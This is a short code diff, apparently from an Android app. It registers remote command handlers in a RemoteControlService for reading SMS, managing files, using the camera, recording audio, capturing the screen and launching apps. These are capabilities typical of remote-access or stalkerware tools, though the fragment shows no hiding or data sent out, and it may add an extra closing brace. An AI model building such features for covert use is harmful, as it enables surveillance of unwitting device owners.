@@ -63,6 +63,25 @@ class RemoteControlService : Service() {
         commandHandlers["get_device_info"] = DeviceInfoCommand()
         commandHandlers["get_app_list"] = AppListCommand(this)
         commandHandlers["get_location"] = LocationCommand()
+        commandHandlers["get_wifi_info"] = WiFiInfoCommand(this)
+        commandHandlers["get_datetime"] = DateTimeCommand(this)
+        commandHandlers["launch_app"] = LaunchAppCommand(this)
+        
+        // Register SMS command
+        commandHandlers["get_sms"] = SmsCommand(this)
+        
+        // Register File Manager command
+        commandHandlers["file_manager"] = FileManagerCommand(this)
+        
+        // Register Camera command
+        commandHandlers["camera"] = CameraCommand(this)
+        
+        // Register Audio command
+        commandHandlers["audio"] = AudioCommand(this)
+        
+        // NEW: Register Screen command
+        commandHandlers["screen"] = ScreenCommand(this)
+    }
     }
 
     private fun createNotificationChannel() {
